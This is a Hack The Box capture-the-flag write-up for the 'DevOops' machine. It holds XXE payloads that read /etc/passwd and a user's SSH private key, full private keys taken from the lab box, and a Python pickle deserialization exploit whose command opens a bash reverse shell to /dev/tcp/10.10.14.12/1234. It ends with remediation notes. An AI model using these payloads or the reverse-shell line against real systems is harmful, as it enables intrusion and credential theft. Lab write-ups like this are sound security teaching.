# DevOops Writeup w/o Metasploit

![](https://miro.medium.com/max/594/1*cQCSgVz_eOW_VsLz6WQLHw.png)

## Reconnaissance <a id="19f1"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.91 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.91Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-28 00:59 EST
Nmap scan report for 10.10.10.91
Host is up (0.042s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnpNmap done: 1 IP address (1 host up) scanned in 0.92 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-28 00:59 EST
Nmap scan report for 10.10.10.91
Host is up (0.031s latency).PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-28 00:59 EST
Warning: 10.10.10.91 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.91
Host is up (0.035s latency).
All 1000 scanned ports on 10.10.10.91 are open|filtered (952) or closed (48)Nmap done: 1 IP address (1 host up) scanned in 42.48 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-28 01:00 EST
Initiating Parallel DNS resolution of 1 host. at 01:00
Completed Parallel DNS resolution of 1 host. at 01:00, 0.01s elapsed
Initiating SYN Stealth Scan at 01:00
Scanning 10.10.10.91 [65535 ports]
Discovered open port 22/tcp on 10.10.10.91
SYN Stealth Scan Timing: About 23.21% done; ETC: 01:02 (0:01:43 remaining)
Discovered open port 5000/tcp on 10.10.10.91
SYN Stealth Scan Timing: About 46.06% done; ETC: 01:02 (0:01:11 remaining)
Warning: 10.10.10.91 giving up on port because retransmission cap hit (1).
SYN Stealth Scan Timing: About 68.91% done; ETC: 01:02 (0:00:41 remaining)
Completed SYN Stealth Scan at 01:02, 131.94s elapsed (65535 total ports)
Nmap scan report for 10.10.10.91
Host is up (0.033s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnpRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 132.12 seconds
           Raw packets sent: 65954 (2.902MB) | Rcvd: 65783 (2.631MB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-28 01:02 EST
Nmap scan report for 10.10.10.91
Host is up (0.032s latency).PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.33 secondsRunning Vuln scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-28 01:02 EST
/usr/local/bin/nmapAutomator.sh: line 226:  1608 Segmentation fault      $nmapType -sV --script vuln -p$(echo "${ports}") -oN nmap/Vulns_"$1".nmap "$1"---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.91:5000 -o recon/gobuster_10.10.10.91_5000.txt
nikto -host 10.10.10.91:5000 | tee recon/nikto_10.10.10.91_5000.txt
Which commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.91:5000
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/28 01:03:45 Starting gobuster
===============================================================
http://10.10.10.91:5000/feed (Status: 200) [Size: 546263]
http://10.10.10.91:5000/upload (Status: 200) [Size: 347]
===============================================================
2020/01/28 01:04:33 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting nikto scan
                                                                                                                                                                               
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.91
+ Target Hostname:    10.10.10.91
+ Target Port:        5000
+ Start Time:         2020-01-28 01:04:55 (GMT-5)
--------------------------------------------------------------------
+ Server: gunicorn/19.7.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ 7865 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2020-01-28 01:14:54 (GMT-5) (599 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
                                                                                                                                                                               
                                                                                                                                                                               
---------------------Finished all Nmap scans---------------------Completed in 15 minute(s) and 11 second(s)
```

We have two ports open.

* **Port 22:** running OpenSSH 7.2p2
* **Port 5000:** running Gunicorn 19.7.1

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* The Gobuster scan found two directories: _feed_ and _upload_. The _upload_ directory sounds interesting, we’ll check it out to see if we can get initial access through it.

## Enumeration <a id="37f1"></a>

Visit the application in the browser.

![](https://miro.medium.com/max/1163/1*D8GYGJXbiDRU975-dFW9GQ.png)

The index page makes mention of a _feed.py_ page. This page didn’t show up in our gobuster scan. Visit the page in the application.

![](https://miro.medium.com/max/1269/1*DMp_PGwV3MsN2C2BUrBXPA.png)

We get a 404 error. Next, let’s visit the _upload_ directory.

![](https://miro.medium.com/max/691/1*KlzLWyUJSInUjnIa43Yiyw.png)

It seems to be taking in XML files. When I see an XML upload functionality, the first thing I test for is an XML External Entity \(XXE\) injection. This is a type of attack that exploits how the backend XML parser processes XML data. If successful, it can allow an attacker to view files on the server, conduct a server side request forgery attack, etc.

To test this out, let’s first create an empty test.xml file and upload it. Intercept the request in Burp and send it to Repeater. Then send the request.

![](https://miro.medium.com/max/1265/1*kqshpTN8ocoZZKydfWy-lQ.png)

We get an internal server error, which probably means that there is a certain XML structure that the backend is expecting. The page did make mention of three XML elements: Author, Subject and Content. So after a bit of trail and error, we find that the following payload generated a 200 status code.

```text
<?xml version="1.0"?>
<test>
<Author>test</Author>
<Subject>test</Subject>
<Content>test</Content>
</test>
```

![](https://miro.medium.com/max/1232/1*L6Qepv936C8K1pSd1WBgLw.png)

Now that we have a working request, let’s see if it is vulnerable to XXE injection. Visit the [PayloadAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) section and perform the basic entity test that detects if this vulnerability exists.

```text
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<test>
<Author>&example;</Author>
<Subject>test</Subject>
<Content>test</Content>
</test>
```

The above payload includes the entity “example” in the DOCTYPE element. If the XML parser parses this entity, it will display the string “Doe” in the “Author” element.

![](https://miro.medium.com/max/1244/1*AwL7ROHXXS8n_BlpvebRMA.png)

As can be seen in the response, we now have confirmation that this upload functionality is vulnerable to an XXE injection.

## Initial Foothold <a id="ba18"></a>

Let’s take this exploit a step further and retrieve the content of the _/etc/passwd_ file.

```text
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<test>
<Author>&test;</Author>
<Subject>test</Subject>
<Content>test</Content>
</test>
```

![](https://miro.medium.com/max/1362/1*HQU-9JPx83QcvKLpeTWqMg.png)

Filter the result on users that have a /bin/bash shell assigned to them.

```text
root:x:0:0:root:/root:/bin/bash
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
```

The _user.txt_ file is probably in the _roosa_ home directory. Since SSH is the only other port that is open, let’s check if _roosa_ has an SSH private key in her home directory.

```text
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/roosa/.ssh/id_rsa'>]>
<test>
<Author>&test;</Author>
<Subject>test</Subject>
<Content>test</Content>
</test>
```

![](https://miro.medium.com/max/1413/1*QsmCDc4Kdfm_RIEvo426Nw.png)

Perfect! Save the content of the private key in file _roosa\_id\_rsa_.

```text
-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=-----END RSA PRIVATE KEY-----
```

Change the permissions of the file.

```text
chmod 600 roosa_id_rsa
```

SSH into _roosa’s_ account.

```text
ssh -i roosa_id_rsa roosa@10.10.10.91
```

Grab the user.txt flag.

![](https://miro.medium.com/max/617/1*Oxjy7ilTTkB0PY71ruy23g.png)

## Privilege Escalation <a id="95c6"></a>

View the content of the home directory.

```text
roosa@gitter:~$ ls -la
total 168                                                                                    
drwxr-xr-x 22 roosa roosa 4096 May 29  2018 .                                                
drwxr-xr-x  7 root  root  4096 Mar 19  2018 ..                                                      
-r--------  1 roosa roosa 5704 Mar 21  2018 .bash_history                                                   
-rw-r--r--  1 roosa roosa  220 Mar 19  2018 .bash_logout                                                    
-rw-r--r--  1 roosa roosa 3771 Mar 19  2018 .bashrc                                                         
drwx------ 12 roosa roosa 4096 Jan 29 21:31 .cache
.....
```

Let’s look into the _.bash\_history_ file.

```text
roosa@gitter:~$ cat .bash_history...
ls -altr
cat kak
cp kak resources/integration/authcredentials.key 
git add resources/integration/authcredentials.key 
git commit -m 'reverted accidental commit with proper key'
...
```

Roosa made a commit that contained a key. To view the commit history run the following command.

```text
roosa@gitter:~$ git log
fatal: Not a git repository (or any parent up to mount point /home)
Stopping at filesystem boundary (GIT_DISCOVERY_ACROSS_FILESYSTEM not set).
```

We get an error that the folder we’re in is not a git repository. To find the git repository, locate the .git file.

```text
roosa@gitter:~$ locate .git
/home/roosa/.gitconfig
/home/roosa/work/blogfeed/.git
....
```

It’s in the directory /blogfeed directory.

```text
roosa@gitter:~/work/blogfeed$ git log....
commit dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:37:56 2018 -0400Gunicorn startup scriptcommit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400reverted accidental commit with proper key
....
```

We get a commit id for the commit that reverted the proper key. Use the commit ID to show the difference between that commit and the previous one.

```text
git show 33e87c312c08735a02fa9c796021a4a3023129ad
```

We get back the following result.

```text
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400reverted accidental commit with proper keydiff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
index 44c981f..f4bde49 100644
--- a/resources/integration/authcredentials.key
+++ b/resources/integration/authcredentials.key
@@ -1,28 +1,27 @@
 -----BEGIN RSA PRIVATE KEY-----
-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
+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
 -----END RSA PRIVATE KEY-----
-
```

So it seems that Roosa deleted an RSA private key and replaced it with her own RSA private key. We don’t know who the deleted key belongs to so let’s add it in the file _unknown\_id\_rsa_.

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

Change the permissions on the file.

```text
chmod 600 unknown_id_rsa
```

Try to log into the git account with it.

```text
root@kali:~/Desktop/htb/devoops# ssh -i unknown_id_rsa git@10.10.10.91
git@10.10.10.91's password:
```

It doesn’t work. Let’s try the root account.

```text
root@kali:~/Desktop/htb/devoops# ssh -i unknown_id_rsa root@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage135 packages can be updated.
60 updates are security updates.Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~#
```

We’re in! Grab the _root.txt_ flag.

![](https://miro.medium.com/max/517/1*ZuZrBaTvdNx1D5-zE3OBng.png)

## Extra Content <a id="e0a2"></a>

After rooting this machine, I watched [ippsec’s video](https://www.youtube.com/watch?v=tQ34Ntkr7H4) and discovered an alternative way to gain initial access.

In the index page, there was a mention of a _feed.py_ script that gave us a 404 error when we tried to access it through the application. We can use the XXE injection vulnerability to view the content of the script.

```text
xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:feed.py'>]>
<test>
<Author>&test;</Author>
<Subject>test</Subject>
<Content>test</Content>
</test>
```

We get back the following result in the response.

```text
PROCESSED BLOGPOST: 
  Author: ')
def uploaded_file(filename):
    return send_from_directory(Config.UPLOAD_FOLDER,
                               filename)@app.route("/")
def xss():
    return template('index.html')@app.route("/feed")
def fakefeed():
   return send_from_directory(".","devsolita-snapshot.png")@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']## TODO: VERY important! DISABLED THIS IN PRODUCTION
#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')if __name__ == "__main__":
  app.run(host='0.0.0,0', Debug=True)Subject: test
 Content: test
 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
```

We see that there is a _newpost_ directory that takes in user input \(request data\) in a POST method and loads it using the pickle module.

A quick search on the module tells us what it does.

> The [`pickle`](https://docs.python.org/3/library/pickle.html#module-pickle) module implements binary protocols for serializing and de-serializing a Python object structure.

The page also include the following warning.

![](https://miro.medium.com/max/797/1*cV5mXhThL5oUMqcnD3ipvQ.png)

This is a HUGE red flag! The above warning states that you should never take in data from an untrusted source, however, in the script above, we can see that it takes in request data \(which is client side data that can be tampered with\) and doesn’t do any validation on that data. So we definitely have an arbitrary code execution vulnerability here.

Do a google search on “pickle exploit” to find the following [github page](https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd). Download the exploit code and change the command to a bash reverse shell with the correct IP address and port.

```text
#!/usr/bin/python                                                                              
#                                                                                              
# Pickle deserialization RCE payload.                                                          
# To be invoked with command to execute at it's first parameter.                               
# Otherwise, the default one will be used.                                                     
#                                                                                              
                                                                                               
import cPickle
import sys
import base64DEFAULT_COMMAND = "bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMANDclass PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))print base64.b64encode(cPickle.dumps(PickleRce()))
```

Run the exploit.

```text
root@kali:~/Desktop/htb/devoops# python pickle-payload.py Y3Bvc2l4CnN5c3RlbQpwMQooUyJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyLzEyMzQgMD4mMSciCnAyCnRScDMKLg==
```

We need to insert the above base64 encoded string into the the POST request to _/newpost_. To do that, intercept the request to the index page, send it to Repeater, right click and select the option _Change Request Method_. Then add the path _/newpost_, change the _Content-Type_ to ‘_text_’ and include the base64 string our exploit generated.

![](https://miro.medium.com/max/684/1*fzgGDGKGFJ5kWrMWoFqNsw.png)

Send the request and we get a shell!

![](https://miro.medium.com/max/961/1*xxEZEEfhAIHMBSxnjED-uw.png)

## Lessons Learned <a id="fdf1"></a>

To gain an initial foothold on the box we exploited two vulnerabilities.

1. XML External Entity \(XXE\) injection that allowed us to enumerate users on the box and obtain the SSH private key of the user _roosa_. Remediations for this vulnerability include input validation and properly configuring XML parsers to disable the resolution of external entities.
